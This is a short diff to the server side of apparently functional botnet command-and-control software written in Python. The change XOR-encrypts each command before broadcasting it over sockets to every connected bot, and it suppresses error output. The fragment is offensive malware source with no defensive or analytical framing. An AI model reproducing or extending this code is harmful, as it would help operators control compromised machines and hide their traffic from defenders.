@@ -35,12 +35,13 @@ class Botnet_C_C_Server:
             if self.sending==False:
                 break
         self.sending=True
-        print(command)
+        if self.bots_encryption_key not in [None,''] and command!='':
+            command=XOR.encrypt(command,self.bots_encryption_key)
         for client_socket in self.bots_list:
             try:
                 client_socket.send("{}".format(command).encode())
             except Exception as ex:
-                print(ex)#raise Exception(ex)
+                #print(ex)#raise Exception(ex)
                 try:
                     client_socket.close()
                 except:
